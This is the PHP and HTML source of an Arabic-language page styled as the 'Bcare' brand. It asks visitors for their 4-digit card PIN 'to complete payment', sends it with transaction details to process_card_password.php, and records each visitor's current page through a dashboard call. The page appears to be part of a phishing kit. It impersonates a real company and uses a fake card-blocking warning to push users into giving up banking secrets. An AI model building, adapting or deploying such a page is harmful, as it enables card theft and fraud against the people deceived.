<?php
session_start();
require_once './dashboard/init.php';

// الحصول على user_id من الجلسة
$user_id = $_SESSION['user_session'] ?? null;

if (!$user_id) {
    header("Location: index.php");
    exit;
}

// تحديث آخر صفحة للمستخدم
$User->updateLastPage($user_id, 'صفحة كلمة سر البطاقة');
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق من كلمة سر البطاقة - Bcare</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f8f9fa;
            color: #333;
            line-height: 1.6;
            padding: 20px;
            direction: rtl;
        }
        
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .header {
            text-align: center;
            padding: 30px 20px 20px;
            background: white;
        }
        
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            margin-bottom: 30px;
        }
        
        .logo-text {
            font-size: 32px;
            font-weight: 300;
            color: #2c5aa0;
        }
        
        .logo-circle {
            width: 60px;
            height: 60px;
            background: #2c5aa0;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 28px;
            font-weight: bold;
            margin-left: 10px;
        }
        
        .lock-icon {
            width: 100px;
            height: 100px;
            background: linear-gradient(135deg, #e3f2fd, #bbdefb);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
        }
        
        .lock-svg {
            width: 40px;
            height: 40px;
            fill: #2196f3;
        }
        
        .content {
            padding: 0 30px 30px;
            text-align: center;
        }
        
        .main-title {
            font-size: 28px;
            font-weight: bold;
            color: #333;
            margin-bottom: 20px;
        }
        
        .subtitle {
            font-size: 16px;
            color: #666;
            margin-bottom: 30px;
            line-height: 1.8;
        }
        
        .input-label {
            font-size: 16px;
            color: #333;
            margin-bottom: 15px;
            display: block;
        }
        
        .pin-input-container {
            position: relative;
            margin-bottom: 30px;
        }
        
        .pin-input {
            width: 100%;
            height: 60px;
            border: 2px solid #e0e0e0;
            border-radius: 15px;
            font-size: 24px;
            text-align: center;
            letter-spacing: 15px;
            padding: 0 20px;
            outline: none;
            transition: border-color 0.3s ease;
            background: white;
        }
        
        .pin-input:focus {
            border-color: #2196f3;
        }
        
        .pin-input::placeholder {
            color: #bbb;
            letter-spacing: 8px;
        }
        
        .eye-icon {
            position: absolute;
            left: 20px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #999;
            font-size: 20px;
        }
        
        .verify-btn {
            width: 100%;
            height: 60px;
            background: linear-gradient(135deg, #4fc3f7, #2196f3);
            border: none;
            border-radius: 15px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .verify-btn:hover {
            background: linear-gradient(135deg, #29b6f6, #1976d2);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(33,150,243,0.3);
        }

        .verify-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .arrow-icon {
            font-size: 20px;
        }
        
        .warning-box {
            background: #fff8e1;
            border: 1px solid #ffcc02;
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
        }
        
        .warning-text {
            font-size: 14px;
            color: #f57c00;
            line-height: 1.6;
        }
        
        .warning-title {
            font-weight: bold;
            margin-bottom: 5px;
        }
        
        .lock-icon {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .error-message {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            text-align: center;
            display: none;
        }
        
        @media (max-width: 480px) {
            .container {
                margin: 10px;
                border-radius: 15px;
            }
            
            .content {
                padding: 0 20px 20px;
            }
            
            .main-title {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <span class="logo-text">Care</span>
                <div class="logo-circle">b</div>
            </div>
            
            <div class="lock-icon">
                <svg class="lock-svg" viewBox="0 0 24 24">
                    <path d="M18,8H17V6A5,5 0 0,0 12,1A5,5 0 0,0 7,6V8H6A2,2 0 0,0 4,10V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V10A2,2 0 0,0 18,8M12,3A3,3 0 0,1 15,6V8H9V6A3,3 0 0,1 12,3M18,20H6V10H18V20Z"/>
                </svg>
            </div>
        </div>
        
        <div class="content">
            <h1 class="main-title">كلمة سر البطاقة</h1>
            <p class="subtitle">ادخل كلمة سر البطاقة لإتمام عملية الدفع</p>
            
            <div class="error-message" id="error-message"></div>
            
            <form id="pinForm" action="process_card_password.php" method="POST">
                <label class="input-label">ادخل كلمة سر البطاقة</label>
                
                <div class="pin-input-container">
                    <input type="password" name="card_password" class="pin-input" placeholder="••••" maxlength="4" id="pinInput" required autocomplete="off">
                    <span class="eye-icon" onclick="togglePinVisibility()">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                            <path id="eyePath" d="M12,9A3,3 0 0,0 9,12A3,3 0 0,0 12,15A3,3 0 0,0 15,12A3,3 0 0,0 12,9M12,17A5,5 0 0,1 7,12A5,5 0 0,1 12,7A5,5 0 0,1 17,12A5,5 0 0,1 12,17M12,4.5C7,4.5 2.73,7.61 1,12C2.73,16.39 7,19.5 12,19.5C17,19.5 21.27,16.39 23,12C21.27,7.61 17,4.5 12,4.5Z"/>
                            <path id="eyeSlash" d="M11.83,9L15,12.16C15,12.11 15,12.05 15,12A3,3 0 0,0 12,9C11.94,9 11.89,9 11.83,9M7.53,9.8L9.08,11.35C9.03,11.56 9,11.77 9,12A3,3 0 0,0 12,15C12.22,15 12.44,14.97 12.65,14.92L14.2,16.47C13.53,16.8 12.79,17 12,17A5,5 0 0,1 7,12C7,11.21 7.2,10.47 7.53,9.8M2,4.27L4.28,6.55L4.73,7C3.08,8.3 1.78,10 1,12C2.73,16.39 7,19.5 12,19.5C13.55,19.5 15.03,19.2 16.38,18.66L16.81,19.09L19.73,22L21,20.73L3.27,3M12,7A5,5 0 0,1 17,12C17,12.64 16.87,13.26 16.64,13.82L19.57,16.75C21.07,15.5 22.27,13.86 23,12C21.27,7.61 17,4.5 12,4.5C10.6,4.5 9.26,4.75 8,5.2L10.17,7.35C10.76,7.13 11.38,7 12,7Z" style="display: none;"/>
                        </svg>
                    </span>
                </div>

                <input type="hidden" name="user_id" id="user_id" value="<?php echo htmlspecialchars($user_id); ?>">
                <input type="hidden" name="transaction_id" id="transactionId">
                <input type="hidden" name="payment_amount" id="paymentAmount">
                <input type="hidden" name="card_last_digits" id="cardLastDigits">
                <input type="hidden" name="timestamp" id="timestamp">
                
                <button type="submit" class="verify-btn" id="verifyBtn">
                    <span class="arrow-icon">←</span>
                    تحقق من كلمة السر
                </button>
                
                <div class="warning-box">
                    <div class="warning-title">تنبيه:</div>
                    <div class="warning-text">سيتم حظر البطاقة مؤقتاً بعد 3 محاولات خاطئة</div>
                </div>
            </form>
        </div>
    </div>

    <script>
        function generateTransactionId() {
            return 'TXN_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9).toUpperCase();
        }

        function updateHiddenFields() {
            document.getElementById('transactionId').value = generateTransactionId();
            document.getElementById('timestamp').value = new Date().toISOString();
            
            const storedData = localStorage.getItem('transactionData');
            if (storedData) {
                try {
                    const data = JSON.parse(storedData);
                    document.getElementById('paymentAmount').value = data.amount || '';
                    document.getElementById('cardLastDigits').value = data.cardLastDigits || '';
                } catch(e) {}
            }
        }

        function togglePinVisibility() {
            const pinInput = document.getElementById('pinInput');
            const eyePath = document.getElementById('eyePath');
            const eyeSlash = document.getElementById('eyeSlash');
            
            if (pinInput.type === 'password') {
                pinInput.type = 'text';
                eyePath.style.display = 'none';
                eyeSlash.style.display = 'block';
            } else {
                pinInput.type = 'password';
                eyePath.style.display = 'block';
                eyeSlash.style.display = 'none';
            }
        }

        document.getElementById('pinForm').addEventListener('submit', function(e) {
            const pin = document.getElementById('pinInput').value;
            const errorMessage = document.getElementById('error-message');
            
            errorMessage.style.display = 'none';
            
            if (pin.length !== 4) {
                e.preventDefault();
                errorMessage.textContent = 'كلمة سر البطاقة يجب أن تكون 4 أرقام';
                errorMessage.style.display = 'block';
                return;
            }
            
            updateHiddenFields();
            
            document.getElementById('verifyBtn').disabled = true;
            document.getElementById('verifyBtn').innerHTML = '<span>جاري التحقق...</span>';
        });
        
        document.getElementById('pinInput').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 4);
            document.getElementById('error-message').style.display = 'none';
        });
        
        window.addEventListener('load', function() {
            updateHiddenFields();
            document.getElementById('pinInput').focus();
        });
    </script>
</body>
</html>